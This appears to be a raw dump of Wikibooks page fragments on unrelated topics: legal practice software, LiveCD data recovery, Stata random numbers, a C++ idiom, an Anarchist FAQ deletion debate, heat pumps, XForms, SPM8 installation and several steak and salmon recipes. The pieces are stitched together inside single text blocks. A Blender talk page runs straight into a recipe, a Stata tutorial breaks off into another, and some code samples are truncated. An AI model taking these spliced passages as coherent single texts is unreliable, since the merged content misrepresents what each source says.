      <text xml:space="preserve">Legal Practice Management software is software that law firms and lawyers use to handle their client and matter information, case management including a docket calendar, accounting and financial (billing and bookkeeping) management, document management, conflict management, and other issues related to legal practice management. The American Bar Association recommends that attorneys use software to manage their own legal practice to avoid legal malpractice.&lt;ref&gt;http://technology.findlaw.com/articles/01065/010743.html&lt;/ref&gt;

This book is a guide to what to expect from legal practice management software, as well as what an open source developer might want to consider for developing an open source legal practice management software. As of the writing of this book, there are hundreds of commercial legal practice management software and very few open source versions. This is an open source book written for both lawyers and developers in the hope of developing better quality software for legal practice management.

== Client and Matter Information Management ==
Attorneys and Law Firms keep track of information in a number of different ways. As part of legal billing almost every expense is kept track of by client and matter number. From as far down as using a photocopy machine or fax machine all the way up to representing a client in court. While each client is assigned a client number, there is usually a client number assigned for general office use to keep track of expenses not related to billing clients, but to help cut costs of general work. This is a variation of job cost accounting and can help attorneys and/or law firms become more profitable.

First there needs to be a system to search for client and matter numbers and names. Usually the billing office sets up the data entry of each client and matter number or the legal assistants and/or administrative assistants do that if a law firm or attorney lacks a business office. When an attorney or another employee of the law firm fills out a time sheet each task or job is given a client and matter number so that they can bill the client for work done on the matter. Each matter number has to have a client number associated with it, usually a matter is a court case but it could be anything from legal research, wills, accounting matters, preparing for a case, writing letters and other documents, etc. There needs to be a system to search for client and matter information to keep track of jobs done, as well as copy that information from the database to letters and other documents via bookmarks in the document, like a check request, to automate the office.

There are other things to search by, for example practice area or area of law, work group, billing attorney, legal team, and so on. Sometimes a law firm needs to keep track of client and matter information for these areas. There also needs to be a billing active and search active flags set to see if the client and matter information are still being billed to the client, or are still active with the firm and can be searched. Sometimes the client and matter data is so old that the law firm no longer bills the client or has been marked as search inactive by the business office as a result of record retention. Still even if inactive in some way there is always a need to search for it, but normally there needs to be a way to filter the search so that only the billing active and search active client and matter data is searched to keep the searches faster.

== Case Management and the Docket Calendar ==
In almost any law firm the amount of cases handled can grow so big that they are hard to manage or attorneys can leave a law firm and not tell other attorneys what cases they are handling that it leads to legal malpractice. Any law firm worth their salt has to represent their clients for all cases, or else they face legal malpractice issues. While there is Calendar software for almost any operating system made, attorneys usually don't share their docket calendar with other attorneys and either the data goes with the attorney who takes their laptop with them, or the desktop or laptop gets reformatted and the data is deleted. Also when an attorney goes on vacation or gets sick, nobody knows what he or she was covering as far as the case management and docket calendar cover. What a horrible way to manage cases and the docket calendar when the data goes missing.

The solution to this is to store the case management and docket calendar on a shared server and when an attorney leaves the law firm or gets sick or goes on vacation, someone else can reassign his/her cases and docket calendar with other attorneys that can cover for them. This helps to prevent legal malpractice as well as helps to give the law firm a more professional image. A law firm loses their professional image when they miss court dates or are not there for their clients. No amount of public relations can help gain that professional image back, especially when the news media covers the law firm's missing of court dates and other legal malpractice.

== Accounting and Financial (Billing and Bookkeeping) ==
The legal practice management software should handle billing and bookkeeping, aka the accounting and other financial data. This means the time sheets of attorneys and every other employee and every expenses should be accounted for and billed to the client or put into an expense for the law firm if it is not client related. It should follow accepted accounting practices for the nation the law firm is located in, and in the case of international law firms be able to show the accounting books in the format of every nation the law firm has an office in. Sometimes the software is only written for one nation's accounting practices, like the USA, but not another. In that case there should be an option to export the accounting data to another program that can put the accounting books in the correct accounting format that another accounting software can use to organize the books.

== Document Management ==
The law firm needs software to keep track of the documents they create as well as documents they collect via evidence for court. Keep in mind that the original documents that are usually scanned and then put into an image database need to be kept in case the judge of a court requests the originals, as some judges want to see the original watermarked documents and not the copy that was scanned into the database or copied by hand. The document database should be able to keep track of document changes, and have a search feature to search by client and matter information and other information covered in other parts of this book such as area of law or practice area, work group, billing attorney, case number, and so on.

== Conflict Management ==
A Law Firm needs to know when there are conflicts of almost any type. Is the attorney related to someone involved in the case, or the client, etc? Each law firm has their own code of ethics that helps avoid conflicts, so this part of the program may need to be customized to each law firm. If there is a conflict of interest, it needs to be recorded via client, matter, work group, case number, and so on, so that when the same thing comes up again, the law firm can avoid it by reassigning a different attorney to the case, and so on. The last thing a law firm needs is to have a case thrown out of court due to a conflict that they easily could have noticed via conflict management software.

      <text xml:space="preserve">Although many companies offer services to recover data after a hard drive failure, the price can be steep. There are also companies that offer data recovery software ranging in price from $30 to over $100. However, data recovery is often possible for no cost (other than your time) through the use of one of the many variations of Linux LiveCD which can be burned to a bootable CD or DVD. Because Linux is open-source, you can download and create such a CD or DVD and the only cost will be for the CD or DVD you use. You can find a list of LiveCD variations at [http://www.livecdlist.com/].

      <text xml:space="preserve">== Alternative Method? ==

Hi, I found an alternative method to showing the mouse pointer. I have 2.49a and here is how I did it: 

Add the Python code to the text editor.

Add an always sensor and a python controller to something and connect them.

Add the name of the code to the controller

Press P

This worked for me. Try it yourself and if it works for you I think we should add it to the page. ([[User:Orfo|Orfo]] ([[User talk:Orfo|talk]]) 23:32, 11 July 2009 (UTC))


Why would the showing the mouse pointer consume a lot of resources, since mouse pointers is such a basic function.

Would Orfo's method (above) consume less? --[[User:Spudgunne|Spudgunne]] ([[User talk:Spudgunne|talk]]) 01:25, 13 October 2009 (UTC)

These mouthwatering strip steaks are cooked slowly until fork-tender. No need to slice across the grain or anything, because they're already very tender, almost like a filet.

== Ingredients ==
*4 6-8 ounce strip steaks
*Salt and freshly ground black pepper
*Extra-virgin olive oil
*1 cup red wine
*1/2 cup beef broth

== Procedure ==
#Heat a large cast iron skillet over high heat for 6 minutes.
#Meanwhile, brush steaks liberally with extra-virgin olive oil. Sprinkle liberally with salt and freshly ground black pepper.
#Place steaks in pan and cook until browned and slightly charred on both sides. Remove to a roasting rack set in a roasting pan. 
#Insert a probe thermometer into one of the steaks and bake at 225 degrees until internal temperature reaches 140 degrees F for medium-rare.
#Remove steaks from pan and keep warm.
#Skim fat from drippings and place pan on high heat on two burners. Deglaze pan with broth. Bring to a boil and cook until liquid has reduced by 2/3.
#Remove pan from heat and add wine. Once alcohol has cooked off, place pan back on two burners. Cook until liquid has reduced by 2/3.
#Pour into a squirt bottle. Make a fancy plate with the sauce and serve warm.</text>

      <comment>replacing obsolete function (uniform() has been replaced with runiform() as of stata 10.1)</comment>
      <text xml:space="preserve">&lt;noinclude&gt;{{Stata/Navigation}}&lt;/noinclude&gt;


== Generate a univariate uniform distribution ==

* The function -runiform()- returns uniformly distributed pseudorandom numbers on the interval [0,1)

&lt;pre&gt;
. set obs 10
obs was 0, now 10
. gen x = runiform()
&lt;/pre&gt;

You have built-in random number generation methods for the main distributions. The keyword is ''rnd''. The list of all available distributions is given in the following help file:  -h rnd-

== The Inverse CDF method ==

* The basic function for generating random numbers is uniform(). Therefore you generally have to use the inverse CDF method to sample from other distributions.

We can draw from a uniform distribution : 

&lt;pre&gt;
. clear
. set obs 500
obs was 0, now 500
. gen unif=runiform()
. hist unif
(bin=22, start=.0043096, width=.04522361)
&lt;/pre&gt;

We can draw from a normal distribution : 
&lt;pre&gt;
. gen norm=invnorm(runiform())
. hist norm
(bin=22, start=-2.8517358, width=.23821211)
&lt;/pre&gt;

We can draw from a &lt;math&gt;\chi^2&lt;/math&gt; distribution 
&lt;pre&gt;
. gen chi2=invchi2(1,uniform())
. hist chi2
(bin=22, start=.00002381, width=.50381869)
. gen chi210=invchi2(10,uniform())
. hist chi210
(bin=22, start=1.8273849, width=1.3336678)
&lt;/pre&gt;

We can draw from a Fisher Snedecor distribution 
&lt;pre&gt;
. gen fisher=invF(10,10,uniform())
. hist fisher
(bin=22, start=.14025442, width=.39209784)
&lt;/pre&gt;

We can draw from a Student distribution. Remember that &lt;tt&gt;invttail()&lt;/tt&gt; is not the inverse of the CDF (cumulative distribution function) but the inverse of the survival function (1 - the CDF).

&lt;pre&gt; 
. gen student=1-invttail(10,uniform())
. hist student
(bin=22, start=-3.9568543, width=.4741968)
&lt;/pre&gt;

== Multivariate Normal Distributions == 

'''drawnorm''' draws directly from a multivariate normal distribution.

These steaks, seasoned with spices and herbs, will save you money that you might have used to go to a steakhouse.

== Ingredients ==
* 4 (6-8 ounce) beef strip steaks, 1 inch thick
* 1/2 tsp salt
* 1 tsp coarsely ground black pepper
* 1 1/2 tsp dried rosemary
* 2 tsp dried thyme
* 1 tbsp smoked paprika
* 1 tbsp chili powder
* 1 tbsp garlic powder
* Extra virgin olive oil

== Procedure ==
#Combine seasonings. Set aside.
#Brush steaks liberally with olive oil. Rub each side of steaks with seasoning mixture. Leave at room temperature 30-45 minutes before continuing.
#Prepare grill for indirect heating, high on one side, medium on the other. Add steaks to high part of grill and cook 1 1/4 minutes. Twist 90 degrees and cook for another 1 1/4 minutes. Flip and repeat one more time.
#Move steaks to medium and cook, turning often, until internal temperature reaches 140 degrees F for medium-rare.
#Remove to a plate and cover with aluminum foil. Let rest 7-10 minutes.
#Slice steaks thinly across the grain on a bias. Serve warm.</text>

      <text xml:space="preserve">=&lt;center&gt;Return Type Resolver&lt;/center&gt;=
=== Intent ===
Deduce the type of the variable being initialized or assigned to.

=== Also Known As ===

=== Motivation ===
The type of the variable being initialized can be a useful information to have in certain contexts. Consider, for instance, we want to initialize STL containers with random numbers. However, we don't know the exact type of the container expected by the user. It could be std::list, std::vector or something custom that behaves like STL container. A straight-forward approach to write and use such a function would be as follows.

&lt;source lang=&quot;cpp&quot;&gt;
template &lt;class Container&gt;
Container getRandomN(size_t n) 
{
  Container c;
  for(size_t i = 0;i &lt; n; ++i)
    c.insert(c.end(), rand());
  return c;
}

int main (void)
{
   std::list&lt;int&gt; l = getRandomN&lt;std::list&lt;int&gt; &gt; (10);
   std::vector&lt;long&gt; v = getRandomN&lt;std::vector&lt;long&gt; &gt; (100);
}
&lt;/source&gt;

Note that the type of the container must be passed to the function because that is the desired return type of the function. Clearly, the type must be repeated at-least twice. Return type resolver idiom can be used to address this issue.

=== Solution and Sample Code ===
Return type resolver idiom makes use of a proxy class and templatized conversion operator functions in the class. ''getRandomN'' function above can be implemented with a class and a member conversion function as follows.

&lt;source lang=&quot;cpp&quot;&gt;
class getRandomN 
{
  size_t count;

public:
  getRandomN(int n = 1) : count(n) {}

  template &lt;class Container&gt;
  operator Container () {
    Container c;
    for(size_t i = 0;i &lt; count; ++i)
      c.insert(c.end(), rand()); // push_back is not supported by all standard containers.
    return c;
  }
};

int main()
{
  std::set&lt;int&gt; random_s = getRandomN(10);
  std::vector&lt;int&gt; random_v = getRandomN(10);
  std::list&lt;int&gt; random_l = getRandomN(10);
}
&lt;/source&gt;

''getRandomN'' class has a constructor and a templatized conversion operator function. For initialization, a temporary object of ''getRandomN'' class is created and assigned to the desired container class. C++ compiler attempts to convert the temporary object into the container class object. The only way to do that is via the conversion operator. The conversion operator is instantiated with the type of the container that is being populated. Due to automatic resolution of the return type, the user does not have to spell it out again. Note that &lt;code&gt;insert&lt;/code&gt; member function has been used instead of &lt;code&gt;push_back&lt;/code&gt; because &lt;code&gt;std::set&lt;/code&gt; does not support &lt;code&gt;push_back&lt;/code&gt;.

=== Known Uses ===
The [[More C%2B%2B Idioms/nullptr|nullptr]] idiom makes use of the return type resolver idiom to automatically deduce a null pointer of the correct type depending upon the pointer variable it is assigning to.

This appears to be [[w:An Anarchist FAQ|a source text]]. This should rather be on Wikisource. [[User:ViperSnake151|ViperSnake151]] ([[User talk:ViperSnake151|talk]]) 14:11, 8 May 2009 (UTC)

: [[Image:Symbol keep vote.svg|15px]] '''Keep''' Seems to be intended as an evolving text. If this is pretty much identical to the original FAQ ''and'' the original is uploaded to WS, then we can delete this. The content here seems to be incomplete.
: It might, however, be worth renaming this to distinguish it from the original FAQ. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 08:18, 9 May 2009 (UTC)

: '''Keep''', although it's a little bit annoying that they have so many redlinks in such a huge TOC. I have sincere doubts that any new author will see such a daunting task list and be able to do anything about it. Time will tell if I am wrong or right, however. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 16:27, 17 May 2009 (UTC)
: '''Keep'''. Wikifying it here allows for further developments of the text. I invested about an hour in wikifying a few chapters, if more people did the same the redlinks would soon disappear. --[[User:LibertarianLibrarian|LibertarianLibrarian]] ([[User talk:LibertarianLibrarian|talk]]) 17:47, 23 May 2009 (UTC)

: I think the overall impression is that it is intended as a developing text, not simply a reproduction, so it belongs here. How does the decision making process work? When can we remove it from the list of deletion candidates?  &lt;small&gt;&lt;span class=&quot;autosigned&quot;&gt;—Preceding [[w:Wikipedia:Signatures|unsigned]] comment added by [[User:129.13.72.177|129.13.72.177]] ([[User talk:129.13.72.177|discuss]] • [[Special:Contributions/129.13.72.177|contribs]]) 11:49, 26 May 2009&lt;/span&gt;&lt;/small&gt;

:First off, [[File:Symbol redirect vote.svg|15px]] '''Transwiki''' to http://anarchistwiki.wikia.com/wiki/Anarchist_Wiki, to http://wiki.infoshop.org/Anarchist_FAQ, or to another wiki related to the subject.

As for the article itself, it's not presented in a textbook format, but rather an FAQ format; as such, it may not be suitable within Wikibooks.  I'm not sure if it would work in WikiSource, but it would need to be peer-reviewed or published formally for inclusion; but there's enough references that it may work anyway.   --[[User:Sigma 7|Sigma 7]] ([[User talk:Sigma 7|talk]]) 20:23, 13 June 2009 (UTC)

==Second nomination==

This was [[Wikibooks:Requests_for_deletion/Anarchist_FAQ|previously nominated for deletion]] in 2009; it was kept, on the hope that it would evolve significantly from the source material.  However it hasn't.  There have only been a handful of edits since 2009, most of them simply importing from the source or wikifying.

However my main concern is one that I don't really see addressed in the previous discussion, that of POV.  I removed an NPOV template from one of the modules since the adder gave no specific objections, however I then looked over most of the book, and realized why the didn't.  Pretty much the whole book is POV and there's no way I can see to making it NPOV; it's really just a soapbox.

On account of this issue ''and'' on account of the fact that it hasn't be developed, I suggest deletion, possibly moving to Wikisource, though I'm not sure it really belongs there either. (My impression was the WS was more for things that ''didn't'' originate online, but that's something for the WS community to decide.) --[[User:Quintucket|Quintucket]] ([[User talk:Quintucket|discuss]] • [[Special:Contributions/Quintucket|contribs]]) 15:57, 30 December 2011 (UTC)

: The nominator last time had began to copy it to Wikisource, but [[Wikisource:An Anarchist FAQ]] is even less developed. POV is a reason to improve a book, rather than a reason to delete. In the context of Anarchism, how is the book not neutral? --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 22:09, 30 December 2011 (UTC)

::My point is that I don't think the book ''can ever'' be made NPOV, precisely because, as the Anarchist FAQ, it is intended to answer questions about anarchism from an Anarchist's position.   Imagine if I created a book called the &quot;Creation Science FAQ.&quot; There are plenty of those on the internet, the problem is that every one of them contains arguments that are very easily debunked.  Now that's an extreme example, and though most of the claims anarchism are an opinion, the problem is the same: The goal is to have a book which prevents the opinion of of one side.

::Now, a guide to world political systems would be NPOV, but there's no way this could be turned into that. Even a book on the history of anarchism might be made NPOV, though it would require somebody who cares enough to contribute to a work on anarchism who isn't an anarchist, or is at least a fair-minded anarchist.  

::Even then, if I were to write a book on anarchism (I'd probably do that if you paid me, though I don't care much about fringe political factions), there's no way I'd use this as a basis. (I probably wouldn't even use it as a reference.) That would requite a complete reorganization of the book, deletion of many chapters, and complete rewrites of pretty much all the others, and move to a new title. Unless somebody wants to do that, and that specifically, not write a new book on Anarchism from scratch, (and in two years, we can't even get anybody to contribute to a defense of anarchism), there's absolutely no point in keeping it.

::What we have is an FAQ, copied pretty much verbatim two years ago from an anarchist website, with no attempts to improve it.  Wikibooks is a place for texbooks, not a soapbox for textbook-length political manifestos. --[[User:Quintucket|Quintucket]] ([[User talk:Quintucket|discuss]] • [[Special:Contributions/Quintucket|contribs]]) 22:56, 30 December 2011 (UTC)

::: [[WB:NPOV]] describes NPOV as depending on a book's scope. A book with the scope of Anarchism from an Anarchist's POV is neutral as long as the mainstream view of Anarchist is represented in what is taught, that is if the book is to teach mainstream Anarchism. A book about Anarchism doesn't need to cover other political systems to be considered neutral. A book on Intelligent Design or Creationism would be within scope as well. Wikibooks has [[Biblical Studies]] and other books about [[:Category:Religion|Religion]]. OTOH a book with the intended scope to cover world political systems would not be considered NPOV if there was no attempt to teach the many political systems that exist. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 23:30, 30 December 2011 (UTC)

:::: I don't see where in the NPOV policy it would permit a POV book.  Religion and Biblical studies are both legitimate fields of study (and I'm speaking as an unabashed atheist here), in the same way that political science is.  In fact I met a few students doing majoring in religious studies when I was in college who were also nontheists.  Now, a book called &quot;Why the Bible is True,&quot; would specifically advocate a specific viewpoint, and therefore be NPOV. Quoting [[WB:SOAP]]:
:::::: Wikibooks is not a soapbox, or a vehicle for propaganda and advertising. Therefore, Wikibooks modules are not:
::::::# propaganda or advocacy of any kind. Wikibooks modules must always adhere to the neutral point of view. You might wish to go to Usenet or start your own blog if you want to convince people of the merits of your favourite views.
::::::# personal essays that state your particular opinions about a topic. Wikibooks is not a vehicle to make personal opinions become part of human knowledge.
:::: This book is of course ''nothing but'' personal essays and propaganda.  Each page is an implausible leading question, (e.g.[[Anarchist_FAQ/What_is_Anarchism%3F/2.5|Why are anarchists in favour of equality?]]) used as an excuse to write an essay. --[[User:Quintucket|Quintucket]] ([[User talk:Quintucket|discuss]] • [[Special:Contributions/Quintucket|contribs]]) 23:49, 30 December 2011 (UTC)
:::: I will agree with you that [[Anarchist FAQ]] has many NPOV issues, the naming isn't ideal, nor is the formatting of the book. However, I don't see it as grounds for definite deletion. As outlined in [[Introduction to Philosophy/Anarchism]], Anarchism is a valid political ideology with roots in history. I would certainly support books on Liberalism, Conservatism, [[Feminism]], Socialism, etc. To vote for the deletion of Anarchism based on its status as a radical and minority political ideal, and therefore less &quot;legitimate&quot; than any study of Theism, would in itself be a question of NPOV. 

:::: The general actions of wikibookians seem to err on the side of salvaging works. Since this book is clearly unfinished and abandoned, I would instead support keeping the book and tagging it with NPOV and expand markers. My next action would be either adopting the book and fixing the NPOV by developing a new scope for the book, or simply suggesting those moves on the talk page for the book, hoping others will one day take notice. --[[User:Thereen|Thereen]] ([[User talk:Thereen|discuss]] • [[Special:Contributions/Thereen|contribs]]) 09:20, 6 January 2012 (UTC)

::::: I disagree with the opinion that a POV book is impossible at Wikibooks, and concur with Darklama assertion that the POV depends on how the scope is set. Having said this I must note that on Wikibooks a book scope and its community is not static, and so over time it may evolve. 
::::: I would oppose for instance your option of tagging it as a NPOV violation, if you did not commit at least to make a some effort to put the work in the a NPOV path. The few times I placed NPOV violation tags were when there was a evident distortion of reality or suppression of divergent views, no editor is obligated to cater to views he objects, but the NPOV requirement to me means the need to at least state that other views exist, unless the scope makes that requirement unnecessary and these are extremely rare. In the book targeted by the RfD a quick look at it only identifies a few pages that may have problems &quot;Section C - What are the myths of capitalist economics?&quot; and pages on the A.5 section. I did a quick read of Section C and did not find any major NPOV problems...
::::: I'm '''opposed''' to the deletion.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|discuss]] • [[Special:Contributions/Panic2k4|contribs]]) 20:45, 6 January 2012 (UTC)

      <text xml:space="preserve">Hello, Leigh Blackall from Otago Polytechnic in New Zealand. We have been funded to re write a business planning workbook based on [http://www.nzte.govt.nz/get-ready-to-export/Starting-a-business/Pages/Guides-to-starting-a-business.aspx what is commonly used] throughout NZ. Our brief is to write a simple, highly accessible workbook that includes a template for a business plan with the notable difference being that this plan will be for developing a sustainable business - probably following a simplified triple bottom line idea. 

I'm in two minds - create a new Wikibook called Starting a Sustainable Business - or start contributing to this one. The thing is - our edits will be fast and many, with a specific objective in mind.

Salmon fillets are marinated in jerk spices, such as Scotch bonnet peppers, allspice, cinnamon, nutmeg, thyme, and ginger.

== Ingredients ==
* 4 (6 ounce) salmon fillets with skin on one side
* 2 tbsp minced ginger
* 2 Scotch bonnet '''''or''''' habanero peppers, stemmed and seeded if you like
* 1 1/2 tsp salt
* 1 1/2 tsp freshly ground black pepper
* 1/4 tsp freshly ground Grains of Paradise, or more pepper
* 1/2 tsp freshly ground allspice
* 1/2 tsp freshly ground cinnamon
* 1/4 tsp freshly grated nutmeg
* 8 sprigs thyme
* 1/2 cup olive oil
* A heat-resistant towel tied with twine and soaked in oil

== Procedure ==
#In a blender or food processor, puree all ingredients except, towel, salmon, and oil until smooth. With the machine running, slowly drizzle in the oil.
#Pour into a gallon size zip-top bag. Add salmon and refrigerate for at least 10 minutes.
#Heat about 28 charcoal briquets in a large chimney starter. Disperse evenly around the bottom of the grill.
#Reapply the grate. Quickly lube the grate with the towel.
#Add the salmon skin side down and cook, covered, turning often, until pink throughout and flakes easily when tested with a fork.
#Remove to a plate and cover with aluminum foil. Let rest 5-7 minutes before serving warm.</text>

Stuffing a steak with blue cheese is a great replacement for a pan sauce or steak sauce. Oh, and Chateaubriand is actually the name of a dish, not the cut.

== Ingredients ==
* 1 to 1 1/4-pound tenderloin roast cut from the center of the whole tenderloin 
* Salt and freshly ground black pepper
* Olive oil
* 5 ounces crumbled Gorgonzola cheese

== Procedure ==
#Make a slit in the center of the roast, but not all the way through.
#Brush roast with olive oil and season liberally with kosher salt and freshly ground black pepper. Let sit at room temperature 30-60 minutes.
#Heat a cast-iron grill pan over high heat 5-7 minutes. Add roast and cook until browned and slightly charred on all sides.
#Move to a baking pan and fill the slit with cheese. Tie closed with kitchen twine and let rest 20 minutes while oven heats to 325 degrees F.
#Insert a probe thermometer at a 45 degree angle into the center of the roast. Place the pan into the oven and cook until internal temperature reaches 135 degrees F.
#Remove to a plate and cover with aluminum foil. Let rest 15 minutes before untying and carving.</text>

      <text xml:space="preserve">&lt;p style=&quot;text-align:center&quot;&gt;&lt;b&gt;Ground Source Heat Pumps&lt;/b&gt;&lt;/p&gt;

A Ground Source Heat Pump, is a heating/cooling system based on a Heat pump that gets it's source from the ground. There are many different techniques that can be used to extract heat from the ground, but the safest one ecologically speaking is the closed loop type.

Despite this, many people who pioneered this type of heating, experimented and continue to experiment with alternate techniques that are not as expensive, or are more ecologically or legally sensitive. One such technique called Open Loop Geothermal, has been recommended against due to its potential for cross contamination of water sheds. Others such as deep lake geothermal have been recommended against for the damage they might do to fish habitat.

The main reason that closed loop geothermal is not recommended against is because the contaminants tend to stay within the system, at least until the system breaks down some 70 years in the future. By judicious choice of antifreeze, it should be possible to keep contamination down to an ecologically sound level even at that time. Further the installation lies under the surface of the ground where there is less chance of an accidental broaching of the system.

A Ground Source Heat Pump, consists of a number of different loops that work together to produce the effect of geothermal heating or cooling. The Ground Loop brings the temperature of the ground into the building, using nothing much more complex than pipes in the ground, filled with a water antifreeze mix. The refrigeration coils transfer heat between the ground loop and the air loop, and the Air loop transfers heat between the refrigeration loops and the buildings air.

The secret that makes this system work, is the heat pump which is a large refrigeration unit that can often pump heat both ways. The system works quite simply by pumping heat out of the ground, and into the building, thus heating the building, or pumping heat out of the building and storing it in the ground thus cooling the building. The reason that this is possible and cost effective, is simply that the ground is heated every day by the sun, and so we are not creating heat so much as pumping it from place to place, which is much less expensive.

Modern two stage scroll compressors, are capable of being installed into Geothermal systems that produce 320% more heat than they consume power. In places where refrigeration and heating are both involved efficiencies have been reported up to 700% of the power it takes to run the system.

However the more complex the system involved the larger the up-front cost, extending the pay back period for a particular installation.

      <text xml:space="preserve">== Motivation ==
You want to only display a full representation of a control when the user wants to set or change the control's value.

== Method ==
We will use the switch/case and toggle elements to conditionally display a custom control.  When the user opens
a form a small &quot;show value&quot; of this control is visible and a trigger to set or change the value of the control.  After the user selects a value
the control reverts to a view that minimizes the screen area.

== Screen Images ==

There are two ways that this control is viewed.  The first takes only a small areas of the form and is a read-only view.  It shows all the current values of the months selected.
[[Image:xforms-control-hidden.png|center|frame|XForms Control Hidden]]
When the users select the &quot;Set Months&quot; trigger the full control is made visible.  When you are done setting the months the control is set back to the hidden mode.

== Sample Code ==

&lt;source lang=&quot;xml&quot;&gt;
&lt;html
    xmlns=&quot;http://www.w3.org/1999/xhtml&quot;
    xmlns:xf=&quot;http://www.w3.org/2002/xforms&quot;

      <text xml:space="preserve">== Basic Form Input ==
One of the most common user interface controls in a web form is a simple, one-line text field.  In this example we have a very simple form with two input fields.  Each input has its own label to the left of the input field.

[[Image:XForms-input.jpg|frame|center]]

== Link to XForms Application ==

[http://xforms-examples.googlecode.com/svn/trunk/02-controls/01-input/Input-value-styling.xhtml Input Fields]

== Program Structure ==
Our program has two parts, a model and a view.  The model has instance data in it to store the values that the user enters in the form.  The view is part of the presentation in the body of the HTML document.

         Output Last Name: &lt;b&gt;&lt;xf:output ref=&quot;PersonSurName&quot;/&gt;&lt;/b&gt;
      &lt;p&gt;Note that as you type the model output will be updated.&lt;/p&gt;
   &lt;/body&gt;
&lt;/html&gt;
&lt;/source&gt;

== Hints ==

You can also provide the user with data entry hints using the &lt;xf:hint&gt; element.

== Discussion ==
Notice that as you type, the output gets immediately updated.  This is because the XForms input control has an &lt;code&gt;&lt;b&gt;incremental=&quot;true&quot;&lt;/b&gt;&lt;/code&gt; attribute.

Our model is simple, just the first and last name of a person.

Note that the '''&lt;code&gt;label&lt;/code&gt;''' and '''&lt;code&gt;hint&lt;/code&gt;''' tags are nested INSIDE the input tags.

== SPM8 ==

Mac Intel with 64bit MATLAB (available since R2009b) is a supported SPM8 platform. Precompiled MEX files (*.mexmaci64) are included in the SPM distribution.

=== Installation ===

Download [http://www.fil.ion.ucl.ac.uk/spm/software/download.html spm8.zip] and its updates [ftp://ftp.fil.ion.ucl.ac.uk/spm/spm8_updates/ spm8_updates_rxxxx.zip] in your home directory then type the following in a Terminal:
&lt;pre&gt;&lt;nowiki&gt;
cd /Users/login
unzip spm8.zip
unzip -o spm8_updates_rxxxx.zip -d spm8
&lt;/nowiki&gt;&lt;/pre&gt;
Start MATLAB and add SPM into your path, either using ''File &gt; Set Path &gt; Add Folder...'' or typing
&lt;pre&gt;&lt;nowiki&gt;
addpath /Users/login/spm8
&lt;/nowiki&gt;&lt;/pre&gt;
in MATLAB's workspace.

=== Compilation === 

Should you want to compile SPM MEX files, you need to have Apple's development environment [http://developer.apple.com/tools/xcode/ Xcode] installed. It should be available on your Mac OS X installation DVD.

You also need to have the ''mex'' executable in your system path. To do so, type the following in a Terminal:
&lt;pre&gt;&lt;nowiki&gt;
export PATH=$PATH:/Applications/MATLAB_R2009a.app/bin
&lt;/nowiki&gt;&lt;/pre&gt;
with the appropriate path where MATLAB is installed

Then, in a Terminal, from the ''src'' folder of your SPM8 installation, type:
&lt;pre&gt;&lt;nowiki&gt;
cd /Users/login/spm8/src
export MACI64=1
make distclean
make &amp;&amp; make install
make toolbox-distclean
make toolbox &amp;&amp; make toolbox-install
make external-distclean
make external &amp;&amp; make external-install
&lt;/nowiki&gt;&lt;/pre&gt;

If you get errors such as ''Bad : modifier in $ (/)'', this is because the instructions are given for a ''bash'' Terminal while you are using a ''tcsh'' Terminal. The equivalent commands are:
&lt;pre&gt;&lt;nowiki&gt;
setenv PATH ${PATH}:/Applications/MATLAB_R2009a.app/bin
setenv MACI64 1
&lt;/nowiki&gt;&lt;/pre&gt;

== SPM5 ==

Precompiled MEX files for Mac Intel with 64bit MATLAB (*.mexmaci64) are available in the latest update.

=== Installation ===

Download [http://www.fil.ion.ucl.ac.uk/spm/software/download.html spm5.zip] in your home directory then type the following in a Terminal:
&lt;pre&gt;&lt;nowiki&gt;
cd /Users/login
unzip spm5.zip
&lt;/nowiki&gt;&lt;/pre&gt;
Start MATLAB and add SPM into your path, either using ''File &gt; Set Path &gt; Add Folder...'' or typing
&lt;pre&gt;&lt;nowiki&gt;
addpath /Users/login/spm5
&lt;/nowiki&gt;&lt;/pre&gt;
in MATLAB's workspace.

=== Compilation ===

If you want to compile SPM5 MEX files by yourself, you need to have Xcode installed and ''mex'' in your system path (see SPM8 for details).

Then, in a Terminal, from the ''src'' folder of your SPM5 installation, type:
&lt;pre&gt;&lt;nowiki&gt;
cd /Users/login/spm5/src
export MACI64=1
make distclean
make &amp;&amp; make install
&lt;/nowiki&gt;&lt;/pre&gt;

== SPM2 ==

There are no plans to provide SPM2 64bit MEX files for Mac Intel.

==Troubleshooting==

===&quot;This is pdfTeX, Version ...&quot; error===
If you get an error message such as:
 mex -O -c spm_vol_utils.c -DSPM_UNSIGNED_CHAR 
 mex: unrecognized option `-O'
 mex: unrecognized option `-c'
 This is pdfTeX, Version 3.1415926-2.3-1.40.12 (TeX Live 2011)
 restricted \write18 enabled.
 entering extended mode
 (./spm_vol_utils.c
 This is MeX  Version 1.05  18 XII 1993  (B. Jackowski &amp; M. Ry\'cko)
 ! You can't use `macro parameter character #' in vertical mode.
this is due to a conflict between MATLAB ''mex'' and a LaTeX command with the same name. Edit ''src/Makefile.var'' and mention the full path when referring to MEXBIN
 MEXBIN = /Applications/MATLAB_R2012a.app/bin/mex

      <comment>Need updated dongleless instructions</comment>
      <text xml:space="preserve">I am a new user of the MagicJack, and would really like to be able to use it without the dongle. However, when I attempt to follow the instructions for setting this up, I do not find a &quot;MagicJack folder&quot; on the usb dongle. Rather, I see 2 drives list as D:\ containing the files autorun.exe, autorun.ico, autorun.inf, and autorunu.exe. The E:\ drive contains the files autorun.inf and DONT USE THIS DRIVE

Can anyone give me an updated version of how to do this? Please contact c_b_woods on Yahoo.

Thanks!</text>

